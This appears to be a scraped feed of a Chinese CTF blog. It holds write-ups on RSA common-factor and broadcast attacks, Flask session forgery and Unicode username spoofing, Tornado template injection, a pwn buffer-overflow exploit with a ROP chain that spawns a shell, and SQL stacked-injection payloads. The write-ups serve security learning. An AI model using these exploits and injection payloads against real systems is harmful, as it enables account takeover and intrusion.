22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 这是典型的多模数题目，即用同样的公钥加密同样的消息，只是私钥一直在变换 所以这就是一个简单的RSA共享素数攻击，在生成p和q的时候，难免会有2个n共享1个素数 所以我们用gcd遍历n，即可分解出p和q,进而解出m 123456789101112131415161718192021222324252627import libnumimport gmpy2import primefacfrom Crypto.Util.number import long_to_bytesf = open('/Users/miao/Downloads/1.txt', 'rb')txt_content = f.readlines()[3:]n = []c = []e = 65537for i in txt_content: if 'n' in i: n.append(int(i[4:].replace('\\n', ''))) elif 'c' in i: c.append(int(i[4:].replace('\\n', '')))for i in range(0, 19): for j in range(i + 1, 20): if primefac.gcd(n[i], n[j]) != 1: now_n = n[i] now_c = c[i] p = primefac.gcd(n[i], n[j]) q = now_n / p phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) print long_to_bytes(pow(now_c, d, now_n)) # print libnum.n2s(pow(now_c, d, now_n)) 给出几组N和c，求m N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004c = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243 N = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114cc = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242 低指数广播攻击， 即用相同的公钥加密相同的消息，但每一组的n不同，e是一个很小的数，例如3或者10 这个题目给出的是5进制数字，需要先处理一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import gmpy2import gmpyimport libnumfrom Crypto.Util.number import long_to_bytesn1 = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004c1 = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243n2 = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114c2 = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344n3 = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323c3 = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242def boradcast_fuzz(question, e): N = 1 for i in range(len(question)): N *= question[i]['n'] N_list = [] for i in range(len(question)): N_list.append(N / question[i]['n']) t_list = [] for i in range(len(question)): t_list.append(int(gmpy2.invert(N_list[i], question[i]['n']))) sum = 0 for i in range(len(question)): sum = (sum + question[i]['c'] * t_list[i] * N_list[i]) % N sum = gmpy.root(sum, e)[0] # return libnum.n2s(sum) return long_to_bytes(sum)n1 = int(str(n1), 5)n2 = int(str(n2), 5)n3 = int(str(n3), 5)c1 = int(str(c1), 5)c2 = int(str(c2), 5)c3 = int(str(c3), 5)question = [ &#123;'n': n1, 'c': c1&#125;, &#123;'n': n2, 'c': c2&#125;, &#123;'n': n3, 'c': c3&#125;,]for i in range(2, 20): res = boradcast_fuzz(question, i) if 'noxCTF' in res: print res print 'e=%d' % (i) break","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"[HCTF 2018] admin","slug":"HCTF-2018-admin","date":"2019-11-04T07:15:11.000Z","updated":"2019-11-04T07:15:53.775Z","comments":true,"path":"2019/11/04/HCTF-2018-admin/","link":"","permalink":"https://darkwing.moe/2019/11/04/HCTF-2018-admin/","excerpt":"","text":"基本信息进去就是login，register，源码里有一句注释 1&lt;!-- you are not admin --&gt; 随意注册账号登录进去，有一个change password选项，change页面注释github泄漏： https://github.com/woadsl1234/hctf_flask/ session 伪造因为题目要求admin，源码也可以看到需要session[&#39;name&#39;] == &#39;admin&#39;后会在页面显示flag，根据p师傅之前的文章： https://www.leavesongs.com/PENETRATION/client-session-security.html flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用脚本进行操作： https://github.com/noraj/flask-session-cookie-manager 12$ python3 flask_session_manager.py decode -c .eJw9kE2LwjAURf_KkLWLfm4EFx1SSwvvlZZ0QrIRR6s16XOgrUyN-N-nOOD6cs_l3AfbnYZ27Nh6Gm7tiu0uR7Z-sI9vtmYQqBllc1fuEIKrqRRHg6boFKUxEIQgVKg5WhRFB1l-1yYJQeYOeR6poLbKJV7JP0m53NNi2wOlDmTqA1UORBVCVsWaa4u8viBPfCW_CAPsNaU-Ghsp0fXgDg7dOUZSQSlhRpPMWhytzhofTGGR8jtksGHPFTuMw2k3_dj2-lYoeROBaH6XWoym7kAiaYJZma1VAnsI9KKTx1qcI5DFMlJ3WG1euAvtz-2bJAIUZfKfXPe0BGxqx4mt2G1sh9dtzPfY8w9gTmvt.Xb_HBg.KuktGfJY6uvuJvIBeqzZF6Bk5CUb'&#123;\"_fresh\":true,\"_id\":&#123;\" b\":\"M2YxNWUyYzc3MzRmOTdjNjJhYmE5MmM3MTY3ZDNkNTJhMGIyZjA3MWIzNDI4Y2RkYzA0ODBmYzI0ZTFlMmEzMWE1MmQzMTQ3MGQ5ZDZkNDRiNDA1YWVmN2NlZmE1Njk4YThlMzczNzg5NmY2OWMxNjAxZTdkZGU1MjJkNmIyMGM=\"&#125;,\"csrf_token\":&#123;\" b\":\"ODU4MTUwNjA5NjRhMWNmZmMxYjFkYTNlM2ZhYmI5ZTg4MWJmY2RhNQ==\"&#125;,\"image\":&#123;\" b\":\"T2NTOA==\"&#125;,\"name\":\"test\",\"user_id\":\"10\"&#125;' 可以看到原有的session中name为test，可以尝试将其修改为admin后重新签名，github源码中也有 1SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' 那么就直接尝试使用ckj123作为KEY 12$ python3 flask_session_manager.py encode -t \"&#123;'_fresh': True, '_id': b'ca73d01f58fe172c279fdb1026ba1202390ee0e60b049380c8785511afd9560104b61fa487c4bcb293fc463ef1548d3cad028ce1b5ff4922ab5246e4105a0a33', 'csrf_token': b'bcb966803bad1e8b020d5b7cf5e843fb157ef072', 'image': b'Av32', 'name': 'admin', 'user_id': '10'&#125;\" -s ckj123 .eJxFkE9rwkAUxL9KeWcP-aMXwUNko6TwdllYm769iDUxyUvWQlRiVvzuDULbw8DAwG-YecD-1JeXGpbX_lbOYN8UsHzA2xcsgaI0xkgPmFOotrZDcxzJZ7HKbUucDsi2IZOOKDKvzLqzkySvGxR6gb4ayFexErsQzaa2Ti-koQFNEhDT3bo0UKJguX1n4myBkWUpyNuc7tLouRWSKZ-6uWZrNo3MrZOiHdFN3mSBdLtgYoVk1jV6XMFzBsdLf9pfv9vy_D_ByUYZipRIPLlNi_luTpyMuNUhccGWPzoltLcum2qLznISY7V64Rp3qMo_kv4k_5ucD24K4FC45gwzuF3K_vUbhAE8fwBi-m2U.Xb_MEw._H8R8AAmbOCT1jQg8JQnP7W7Qmo Unicode欺骗这个应该是预期解 源码中显示，各种操作前都会对用户名进行自定义的strlower 123def strlower(username): username = nodeprep.prepare(username) return username nodeprep.prepare对应的库是 https://github.com/twisted/twisted requirements.txt中显示Twisted==10.2.0 版本非常老，明显有问题 根据这篇文章 https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作 1ᴬ -&gt; A -&gt; a 即第一次将其转换为大写，第二次将其转换为小写 那么，攻击链大概就这样 注册用户ᴬdmin 登录用户ᴬdmin，变成Admin 修改密码Admin，更改了admin的密码","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"护网杯2018-easy_tornado","slug":"护网杯2018-easy-tornado","date":"2019-10-30T06:02:23.000Z","updated":"2019-10-30T06:03:33.743Z","comments":true,"path":"2019/10/30/护网杯2018-easy-tornado/","link":"","permalink":"https://darkwing.moe/2019/10/30/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado/","excerpt":"","text":"护网杯2018的一道tornado模板注入题目 12345678&#x2F;flag.txtflag in &#x2F;fllllllllllllag&#x2F;welcome.txtrender&#x2F;hints.txtmd5(cookie_secret+md5(filename)) 给出了以上信息，并且url格式是file?filename=/hints.txt&amp;filehash=1665701fc163e54b3bdc373b5e48446d这样的，直接修改filename为flag的话，得到错误信息： 1&#x2F;error?msg&#x3D;Error 并且页面显示Error,直接修改msg页面显示内容也会改变,根据render提示应该是模板注入，但存在过滤，ORZ 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量 得到secret后，就是计算访问flag文件的hash，获取flag 1234567import hashlibfilename = '/fllllllllllllag'cookie_secret = 'xxxx'file_md5 = hashlib.md5(filename).hexdigest()print file_md5print hashlib.md5(cookie_secret+file_md5).hexdigest()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"buuoj-pwn-rip","slug":"buuoj-pwn-rip","date":"2019-10-29T05:05:36.000Z","updated":"2019-10-29T05:07:28.915Z","comments":true,"path":"2019/10/29/buuoj-pwn-rip/","link":"","permalink":"https://darkwing.moe/2019/10/29/buuoj-pwn-rip/","excerpt":"","text":"题目信息 64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以 动态分析gdb简单看一下，offset23，fun地址0x401186 exploit1234567891011121314from pwn import *sh = remote('node3.buuoj.cn', 28896)# sh = process('./pwn1')# context.arch = 'amd64'# context.log_level = 'debug'fun_addr = 0x401186payload = 'A' * 23+ p64(0x401186)sh.sendline(payload)sh.interactive() 另外一种方式，手动构造ROP： 12345678910111213141516171819from pwn import *sh = remote('node3.buuoj.cn', 28225)elf = ELF('./pwn1')context.arch = 'amd64'# context.log_level = 'debug'# fun_addr = 0x401186bin_sh_addr=0x40201Bpop_rdi=0x4011fbpayload = 'A' * 23payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(elf.symbols[\"system\"])sh.sendline(payload)sh.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF学到的两个SQL知识点","slug":"CTF学到的两个SQL知识点","date":"2019-10-25T01:58:50.000Z","updated":"2019-10-25T02:12:21.310Z","comments":true,"path":"2019/10/25/CTF学到的两个SQL知识点/","link":"","permalink":"https://darkwing.moe/2019/10/25/CTF%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%A4%E4%B8%AASQL%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"主要是两道CTF题目的考点，BUUOJ上有 [强网杯 2019]随便注 首先是常规堆叠注入，这个没什么讲的 表名是一串数字，数字串为表名的表操作时要加反引号 主要利用的就是存储过程： 1?inject&#x3D;1&#39;;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。 @a变量的16进制值转换一下是： 1select * from `数字串表名` [SUCTF 2019]EasySQL首先堆叠注入 后段sql是这样的： 1select $_GET['query'] || flag from flag 考点： MYSQL一种管道符模式。 可以在MYSQL中开启支持管道符来进行字符串的拼接操作： 1set sql_mode=pipes_as_concat; 这样||会作为字符串连接 payload： 11;set sql_mode=pipes_as_concat;select 1 非预期解法： 1*,1 这样带入sql是： 1select *,1 || flag from flag","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Pwn学习笔记24:其他一些技术","slug":"Pwn学习笔记24-其他一些技术","date":"2019-09-24T07:42:54.000Z","updated":"2019-09-24T07:43:34.142Z","comments":true,"path":"2019/09/24/Pwn学习笔记24-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/09/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"ucontextsetjmp/longjmp的最终演变 setjmp()/longjmp() sigsetjmp()/siglongjmp() getcontext()/makecontext()/setcontext()/swapcontext() 1. setjmp()/longjmp() 通过setjmp()设置一个保存点，可以通过longjmp()返回到那里 实现了函数间的goto 只要不从setjmp()的函数退出就有效 返回保存点时，esp寄存器会还原到设置保存点时的值。即只返回stack位置，而不是内容。调用setjmp()的函数一旦退出，stack本身可能与保存点设定时不同，即便还原也可能不能正常工作 正常工作的case： esp还原时，stack frame也还原到正常 非正常工作的case： funcA退出，funcC，funcD调用后，funcD内longjmp()，esp还原，这时候stack frame是funcC，不是原本的funcA 2. sigsetjmp()/siglongjmp()也可以恢复signal stack信息 假如存在一个通过sigaction(2)指定signal stack的signal handler（例如SIG_TERM的handler运行中，不接受SIG_ALRM），当这个handler内通过longjmp()返回保存点时，它不接受SIG_ALRM返回。为避免这种情况，需要一种在longjmp()时还原signal stack信息的处理机制 3. getcontext()/makecontext()/setcontext()/swapcontext() 通过getcontext()设置保存点(context) 通过 makecontext()将context与函数相关联 恢复时，可以从关联的函数进行（带参数） 但是需要给context一个独立的stack区域 只在这种情况下，与setjmp()/sigsetjmp()不同，调用getcontext()的函数退出后仍然有效 也可以指定next context 当这个函数结束时，自动转换到next 通过setcontext()来返回到那个context 通过swapcontext()来返回到那个context，并且保存现在的context ucontext 生成context 根据需要修改context中的信息 通过makecontext()，可以修改为通过特定函数带参数调用 可以直接重写context中的寄存器信息 之后通过setcontext()/swapcontext()进行切换 可以通过适当设置，从任意寄存器状况恢复 context的结构 作为参考，context结构大概是这样(Ubuntu x86_64) ss_sp是指向新stack的指针 ss_size是它的size gregs[0~22]是用来保存通用寄存器及其值 从gregs[0]开始按顺序，R8, R9, R10, R11, R12, R13, R14, R15,RDI, RSI, RBP, RBX, RDX, RAX, RCX, RSP, RIP, EFL, CSGSFS(+pad),ERR, TRAPNO, OLDMASK, CR2 __val是signal mask 